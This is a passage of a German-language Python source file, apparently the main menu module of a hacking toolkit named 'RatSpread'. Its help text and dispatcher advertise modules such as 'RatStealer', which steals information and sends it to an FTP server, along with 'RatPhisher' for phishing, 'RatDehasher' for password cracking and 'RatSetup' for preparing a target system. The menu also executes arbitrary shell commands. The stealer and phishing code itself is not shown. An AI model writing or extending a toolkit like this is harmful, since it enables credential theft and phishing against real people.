            debug(f"{bad} Fehler beim Ändern der Farbe: {e}")
    else:
        rat_print("Farbänderung wird nur unter Windows unterstützt.")

def random_color():
    if DARKMODE is True:
        colors = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"]
        return "0" + random.choice(colors)
    else:
        colors = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "A", "B", "C", "D", "E", "F"]
        return "f" + random.choice(colors)

def disco():
    if os.name == "nt":
        try:
            while disco_running:
                color_code = random_color()
                os.system(f"color {color_code}")
                sleep(0.1)
        except Exception as e:
            error_menu(f"{bad} Fehler: {e}")
    else:
        rat_print("Der Disco modus wird nur unter Windows unterstützt.")

def start_disco():
    global disco_running
    disco_running = True
    threading.Thread(target=disco, daemon=True).start()

def stop_disco():
    global disco_running
    disco_running = False

def Reload():
    rat_print(f"{main_color_theme}RatSpread wird Neugeladen")
    debug("Programm wird neu geladen")
    os.system("call RatMenu.py")
    sys.exit(0)

def wko():
    global wko
    force_clear()
    start_disco()
    rat_print("test")
    sleep(1)
    debug("test")
    wko()

def start_script(script_name):
    if os.path.exists(script_name):
        file_extension = os.path.splitext(script_name)[1]

        try:
            if file_extension == '.py':
                subprocess.run(['python', script_name])  
            elif file_extension == '.bat':
                subprocess.run(['call', script_name], shell=True)  
            elif file_extension == '.sh':
                subprocess.run(['bash', script_name], shell=True)  
            else:
                rat_print_wait(f"{main_color_theme}Unbekanntes Dateiformat: {yellow}{file_extension}", 5)
                main_menu()
        except Exception as e:
            rat_print_pause(f"Fehler beim Ausführen des Skripts: {e}")
            main_menu()
    else:
        rat_print_wait(f"{main_color_theme}Skript '{Secondary_color_theme}{script_name}{main_color_theme}' nicht gefunden.", 5)
        main_menu()

def test():
    from RatSpreadVars import rat_repeat
    show_me

def info():
    menu = f"""
    {main_color_theme}----------------------------- Info Menü -----------------------------{end}
    {Secondary_color_theme}1. Disco Start/Stop:{end}
       {main_color_theme}Beschreibung:{end} Startet oder stoppt den Disco-Modus.
       {main_color_theme}Aufruf:{end}
       - {Secondary_color_theme}Disco starten:{end} 'disco start'
       - {Secondary_color_theme}Disco stoppen:{end} 'disco stop'

    {Secondary_color_theme}2. Farbe ändern:{end}
       {main_color_theme}Beschreibung:{end} Ändert das Farbschema des Skripts.
       {main_color_theme}Aufruf:{end} Geben Sie 'color <farbe>' ein (z. B. 'color blue').

    {Secondary_color_theme}3. Skript starten:{end}
       {main_color_theme}Beschreibung:{end} Startet ein bestimmtes Skript.
       {main_color_theme}Aufruf:{end} Geben Sie 'start <script_name>' ein (z. B. 'start myscript').

    {Secondary_color_theme}4. Reload:{end}
       {main_color_theme}Beschreibung:{end} Lädt das Skript neu.
       {main_color_theme}Aufruf:{end} 'rl' oder 'reload'

    {Secondary_color_theme}5. Clear:{end}
       {main_color_theme}Beschreibung:{end} Löscht den Bildschirminhalt.
       {main_color_theme}Aufruf:{end} 'clear'

    {Secondary_color_theme}6. Test:{end}
       {main_color_theme}Beschreibung:{end} Führt einen Testlauf aus.
       {main_color_theme}Aufruf:{end} 'test'

    {Secondary_color_theme}7. Domain-Verfügbarkeit prüfen:{end}
       {main_color_theme}Beschreibung:{end} Prüft die Verfügbarkeit einer Domain.
       {main_color_theme}Aufruf:{end} 'domain <domain_name>' (z. B. 'domain example.com')

    {Secondary_color_theme}8. Domain anpingen:{end} 
       {main_color_theme}Beschreibung:{end} Pingt eine Domain an, um deren Erreichbarkeit zu testen.
       {main_color_theme}Aufruf:{end} 'ping <domain_name>' (z. B. 'ping example.com')

    {Secondary_color_theme}9. Debug-Modus umschalten:{end}
       {main_color_theme}Beschreibung:{end} Schaltet den Debug-Modus ein oder aus.
       {main_color_theme}Aufruf:{end} 'debug' (Variationen: 'debug on', 'debug off')

    {Secondary_color_theme}10. Rat-Funktionen (Optionen 1-9):{end}
        - **RatStealer** (Option 1): Diese Funktion stiehlt Informationen und sendet diese an einen FTP-Server.
        - **RatNuker** (Option 2): ****************************************************************
        - **RatCrawler** (Option 3): **************************************************************
        - **RatDehasher** (Option 4): Knackt Hashes, um Passwörter oder andere verschlüsselte Daten wiederherzustellen.
        - **Verschlüsselungsmenü** (Option 5): Öffnet ein Menü, in dem verschiedene Verschlüsselungsmethoden verwendet werden können.
        - **RatSetup** (Option 6): Führt eine Setup-Routine zum Einrichten des Zielsystems durch.
        - **RatPhisher** (Option 7): Startet eine Phishing-Aktion, um vertrauliche Informationen von einem Ziel zu stehlen.
        - **RatSave_menu** (Option 8): Speichert Videos von Youtube, etc.
        - **RatCreate** (Option 9): Erzeugt ein neues Python-Skript mit vorgefertigten Funktionen.

    {Secondary_color_theme}11. Programm beenden:{end}
       {main_color_theme}Beschreibung:{end} Beendet das Programm.
       {main_color_theme}Aufruf:{end} '10'

    {Secondary_color_theme}12. Streamer-Modus:{end}
       {main_color_theme}Beschreibung:{end} Schaltet den Streamer-Modus um, möglicherweise um sensible Daten zu verstecken.
       {main_color_theme}Aufruf:{end} '100'

    {Secondary_color_theme}13. ASCII anzeigen:{end}
       {main_color_theme}Beschreibung:{end} Zeigt ASCII-Kunst an.
       {main_color_theme}Aufruf:{end} '200'

    {Secondary_color_theme}14. Willkommensnachricht anzeigen:{end}
       {main_color_theme}Beschreibung:{end} Zeigt eine Willkommensnachricht an.
       {main_color_theme}Aufruf:{end} '250'

    {Secondary_color_theme}15. Lightmode/Darkmode umschalten:{end}
       {main_color_theme}Beschreibung:{end} Schaltet den Lightmode an, dieser zeigt ein minimalistisches Overlay an
       {main_color_theme}Aufruf:{end} '300'
    {main_color_theme}----------------------------------------------------------------------
    
    {main_color_theme}By {Secondary_color_theme}Mausi Schmausi
    
    {main_color_theme}----------------------------------------------------------------------
    {end}"""

    rat_print_pause(menu)

def whois_lookup(domain):
    import whois
    try:
        domain_info = whois.whois(domain)

        rat_print(f"{main_color_theme}------------------- WHOIS Informationen für {Secondary_color_theme}{domain}{main_color_theme} -------------------")
        rat_print(f"{main_color_theme}Domain Name: {Secondary_color_theme}{domain_info.domain_name}")
        rat_print(f"{main_color_theme}Registrar: {Secondary_color_theme}{domain_info.registrar}")
        rat_print(f"{main_color_theme}Whois Server: {Secondary_color_theme}{domain_info.whois_server}")
        rat_print(f"{main_color_theme}Creation Date: {Secondary_color_theme}{domain_info.creation_date}")
        rat_print(f"{main_color_theme}Expiration Date: {Secondary_color_theme}{domain_info.expiration_date}")
        rat_print(f"{main_color_theme}Name Servers: {Secondary_color_theme}{domain_info.name_servers}")
        rat_print(f"{main_color_theme}Status: {Secondary_color_theme}{domain_info.status}")
        rat_print(f"{main_color_theme}Emails: {Secondary_color_theme}{domain_info.emails}")
        rat_print_pause(f"{main_color_theme}------------------- Ende der WHOIS Informationen -------------------")

    except Exception as e:
        rat_print(f"Fehler: Konnte WHOIS-Informationen für {domain} nicht abrufen.")
        rat_print_wait(f"Grund: {str(e)}", 10)


def conectioncheck():
    import subprocess
    import sys
    import psutil
    import subprocess
    import time
    import os
    import socket
    from datetime import datetime
    required_packages = ["psutil"]

    def install(package):
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

    for package in required_packages:
        try:
            __import__(package)
        except ImportError:
            install(package)

    current_date = datetime.now().strftime("%Y-%m-%d")
    log_file_path = f"Rat_network_log_{current_date}.txt"

    def write_to_log(log_data):
        try:
            with open(log_file_path, "a") as log_file:
                log_file.write(log_data + "\n")
        except Exception as e:
            print(f"{red}Fehler beim Schreiben in die Log-Datei: {e}{end}")

    def ping_ip(ip):
        try:
            output = subprocess.check_output(['ping', '-n', '1', ip], stderr=subprocess.STDOUT, universal_newlines=True, encoding='cp850')
            for line in output.splitlines():
                if "Zeit=" in line:
                    return int(line.split('Zeit=')[1].split()[0].replace("ms", ""))
        except subprocess.CalledProcessError:
            return None

    def get_host_by_ip(ip):
        try:
            return socket.gethostbyaddr(ip)[0]
        except socket.herror:
            return "Unknown"

    while True:
        separator = "="*75
        os.system('cls')
        end_log_line = f"{separator}"
        write_to_log(end_log_line)

        header = f"{'IP Address':<20}{'Host':<30}{'Status':<15}{'Ping (ms)':<10}"
        separator = "="*75
        print(f"{white}{header}")
        print(f"{white}{separator}")

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"\n--- {current_time} ---\n{header}\n{separator}"
        write_to_log(log_entry)

        connections = psutil.net_connections(kind='inet')

        for conn in connections:
            if conn.raddr:
                ip = conn.raddr.ip
                status = conn.status
                ping = ping_ip(ip)
                host = get_host_by_ip(ip)

                if ping is None:
                    ping_color = f"{red}N/A{end}"
                    ping_log = "N/A"
                elif ping > 150:
                    ping_color = f"{red}{ping}ms{end}"
                    ping_log = f"{ping}ms"
                else:
                    ping_color = f"{green}{ping}ms{end}"
                    ping_log = f"{ping}ms"

                if status in ["CLOSE_WAIT", "TIME_WAIT", "LAST_ACK"]:
                    status_color = f"{red}{status:<15}{end}"
                else:
                    status_color = f"{yellow}{status:<15}{end}"

                display_host = host if len(host) <= 25 else host[:25] + "..."
                print(f"{white}{ip:<20}{display_host:<30}{status_color}{ping_color}")

                log_line = f"{ip:<20}{host:<30}{status:<15}{ping_log}"
                write_to_log(log_line)
                sleep(1)

def main_menu():
    global contains
    script_status = initialize_scripts()
    while True:
        try:
            if DARKMODE is True:
                rat_print_menu(script_status)
                option = input(f'{Secondary_color_theme}{normal_input}').lower()
                rat_print(f"{end}")
            else:
                rat_print_menu(script_status)
                option = input(f'{lightmode_input}').lower()

            if option == "disco start":
                start_disco()
                continue

            if option in ["help", "?"]:
                info()
                continue

            if option in ["cmd", "terminal"]:
                clear()
                rat_print("Ein neues Terminal wurde erstellt.")
                rat_print(f"Um zum Hauptmenü zurückzukehren schreibe '{Secondary_color_theme}exit{main_color_theme}'")
                rat_print(f"{main_color_theme}===============================================\n")

                os.system("cmd")

                continue

            if option.startswith("color "):
                change_color(option)
                continue

            if option.startswith("start "):
                script_name = option[6:].strip() 
                start_script(script_name)
                sys.exit(0) 

            if option.startswith('command "'):
                end_quote_index = option.find('"', 9)
                if end_quote_index == -1:
                    rat_print(f"Fehler: Befehl nicht korrekt formatiert.{main_color_theme}")
                    debug(f"Fehler: Befehl nicht korrekt formatiert.{main_color_theme}")
                    continue
                
                command = option[8:end_quote_index]
                
                rat_print(f"{main_color_theme}=============================")
                os.system(command)
                rat_print(f"{main_color_theme}=============================")
                rat_print(f'{Secondary_color_theme}{command}"{main_color_theme} Wurde ausgeführt')

                remaining_option = option[end_quote_index + 1:].strip() 
                if "-p" in remaining_option: 
                    rat_pause()
                    main_menu()
                else:
                    time.sleep(5)
                    main_menu()

                remaining_option = option[end_quote_index + 1:].strip() 
                if "-x" in remaining_option: 
                    sys.exit(0)
                else:
                    time.sleep(5)
                    main_menu()

            if option.startswith("pip "):
                pip_command = option[4:].strip()
                os.system(f"pip {pip_command}")
                sleep(5)
                main_menu()

            if option == ("pip"):
                os.system(f"pip help")
                sleep(5)
                main_menu()

            if option.startswith("sleep "):
                sleep_time = option[5:].strip()
                if sleep_time:
                    time.sleep({sleep_time})

            if option.startswith("show me "):
                script_name = option[8:].strip() 
                show_me(script_name)
                sys.exit(0)

            if option.startswith("#"):
                if option == "#?":
                    show_shortcuts()
                else:
                    open_shortcut(option)
                continue

            if option.startswith("show me "):
                script_name = option[8:].strip() 
                show_me(script_name)
                continue

            if option.startswith("showme "):
                script_name = option[7:].strip() 
                show_me(script_name)
                sys.exit(0)

            if option == "disco stop":
                stop_disco()
                continue

            if option in ["rl", "reload"]:
                force_clear()
                Reload()
                continue

            if option in ["close", "exit", "bye"]:
                stop_disco()
                debug("Programm wird beendet")
                rat_print_error(f'{main_color_theme}RatSpread wird beendet')
                sys.exit(0)
                continue

            if option in ["cc", "concheck", "conectioncheck", "ccheck"]:
                conectioncheck()
                continue

            if option in ["clear", "cls"]:
                force_clear()
                continue

            if option == "wko":
                wko()
                continue

            if option.startswith("whois "):
                domain = option[6:].strip()
                if domain:
                    whois_lookup(domain)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option.startswith("domain "):
                domain = option[7:].strip()
                if domain:
                    check_domain_availability(domain)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option.startswith("domaincheck "):
                domain = option[12:].strip()
                if domain:
                    check_domain_availability(domain)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option.startswith("dc "):
                domain = option[3:].strip()
                if domain:
                    check_domain_availability(domain)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option.startswith("domaincheck "):
                domain = option[12:].strip()
                if domain:
                    check_domain_availability(domain)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option.startswith("domain_check "):
                domain = option[13:].strip()
                if domain:
                    check_domain_availability(domain)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option.startswith("ping "):
                global IP
                IP = option[5:].strip()
                if IP:
                    pingdomain(IP)
                else:
                    rat_print_error("Keine gültige Domain eingegeben.")
                continue

            if option in ["debug", "debug on", "debug true", "debug off", "debug false"]:
                debug_switch()
                continue
            if option in ["streamer", "stream", "streamer on", "streamer true", "streamer off", "streamer false"]:
                streamer_Switch()
                continue

            if option.__contains__("test"):
                test()
                continue

            try:
                option = int(option)
            except ValueError:
                debug(f'"{option}" ist keine gültige Eingabe')
                rat_print_error(f'{main_color_theme}Ungültige Eingabe.')
                continue

            if option == 1:
                RatStealer()
            elif option == 2:
                RatNuker()
            elif option == 3:
                RatCrawler()
            elif option == 4:
                RatDehasher()
            elif option == 5:
                verschluesselungs_menu()
            elif option == 6:
                RatSetup()
            elif option == 7:
                RatPhisher()
            elif option == 8:
                RatSave_menu()
            elif option == 9:
                RatCreate()
            elif option == 10:
                stop_disco() 
                debug("Programm wird beendet")
                rat_print_error(f'{main_color_theme}RatSpread wird beendet')
                sys.exit(0)
            elif option == 99:
                debug_switch()
            elif option == 100:
                streamer_Switch()
            elif option == 200:
                show_ascii()
            elif option == 250:
                show_wellcome()
            elif option == 300:
                lightmode_switch()
            else:
                debug(f"Ungültige Option ausgewählt: {option}")
                rat_print_error(f'{main_color_theme}Ungültige Option. Bitte eine Zahl zwischen 1 und 10 eingeben.')
        except KeyboardInterrupt:
            if DEBUG_MODE is True:
                stop_disco()
                rat_print_error(" ")
                debug("Strg+C im Hauptmenü gedrückt, Script wird beendet")
                sys.exit(0)
            else:
                clear()
                main_menu()
        except Exception as e:
            error_menu(str(e))

if __name__ == "__main__":
    disco_running = False
    main_menu()

#By Mausi Schmausites
